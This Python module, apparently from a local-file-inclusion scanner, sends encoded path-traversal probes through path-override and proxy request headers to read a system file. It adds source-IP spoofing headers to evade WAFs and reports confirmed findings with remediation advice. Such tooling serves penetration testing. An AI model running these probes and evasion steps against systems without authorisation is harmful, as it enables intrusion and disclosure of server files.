"""
Header-based Local File Inclusion.

Some applications build a filesystem path (or an internal route) from a request
header — an ``X-Original-URL``/``X-Rewrite-URL`` override, a ``Referer`` used as
a template name, or a proxy path header. This technique replays the traversal
probe through those headers and confirms disclosure with the same structural
detector used for query parameters. It is bounded (one probe file, shallow
depths) so it stays cheap, and it also blends in source-IP spoofing headers when
a WAF was detected upstream.
"""
from __future__ import annotations

from typing import Iterator, List

from lfimachine.core import detector
from lfimachine.core.http import Response
from lfimachine.core.result import Finding, Severity
from lfimachine.core.headers import PATH_OVERRIDE_HEADERS
from lfimachine.payloads import encoders as enc
from lfimachine.payloads import traversal_gen, wordlists
from lfimachine.techniques.base import Technique, TechniqueContext


class HeaderLfiTechnique(Technique):
    name = "header-injection"
    description = "LFI through path-override / proxy request headers"
    priority = 60

    def applicable(self, ctx: TechniqueContext) -> bool:
        return getattr(ctx, "auto_headers", False)

    def _send_with_header(self, ctx, header: str, payload: str) -> Response:
        headers = dict(ctx.point.base_headers)
        headers[header] = payload
        # Spoof headers help when a WAF filters by source IP.
        headers.update(getattr(ctx, "spoof_headers", {}) or {})
        # Keep the query value benign so only the header carries the payload.
        params = dict(ctx.point.base_params)
        if ctx.point.location == "query" and ctx.point.parameter:
            params[ctx.point.parameter] = "index"
        return ctx.client.request(
            ctx.point.method, ctx.point.url,
            params=params or None, headers=headers,
        )

    def run(self, ctx: TechniqueContext) -> Iterator[Finding]:
        log = ctx.logger
        os_name = ctx.os_confirmed or ctx.fingerprint.os or "linux"
        probe = wordlists.PROBES.get(os_name, wordlists.PROBES["linux"])[0]
        target_file, expected = probe["path"], probe["sig"]

        candidates: List[str] = list(PATH_OVERRIDE_HEADERS)
        # Honour any operator-specified headers too.
        for h in ctx.__dict__.get("extra_test_headers", []) or []:
            if h not in candidates:
                candidates.append(h)

        # Shallow, high-signal payload set for header context.
        payloads = []
        for p in traversal_gen.generate(target_file, min_depth=1, max_depth=8):
            payloads.append(p)
            if len(payloads) >= 40:
                break

        if hasattr(ctx, "progress") and ctx.progress:
            ctx.progress.activity("header-injection")

        for header in candidates:
            for raw in payloads:
                for enc_name, encoded in enc.variants(
                    raw, ctx.encoders or enc.default_encoder_order(ctx.aggressive)
                ):
                    if getattr(ctx, "progress", None):
                        ctx.progress.point(f"{header} · {target_file}")
                    resp = self._send_with_header(ctx, header, encoded)
                    det = detector.analyse(resp, ctx.baseline, encoded,
                                           expected_signature=expected)
                    if not det.confirmed:
                        continue
                    log.good(f"LFI via header {header}: {target_file} "
                             f"(conf={det.confidence})")
                    yield Finding(
                        technique=self.name,
                        title=f"Local File Inclusion via {header} header",
                        severity=Severity.HIGH,
                        confidence=det.confidence,
                        url=resp.url or ctx.point.url,
                        parameter=header,
                        method=ctx.point.method,
                        payload=encoded,
                        encoder=enc_name,
                        evidence=det.evidence,
                        matched_signatures=det.matched,
                        os_guess=det.os_guess,
                        status_code=resp.status_code,
                        response_length=resp.length,
                        remediation="Do not derive filesystem paths from request "
                                    "headers; validate and allowlist any routed path.",
                        extra={"injected_header": header},
                    )
                    return  # one confirmed header vector is enough
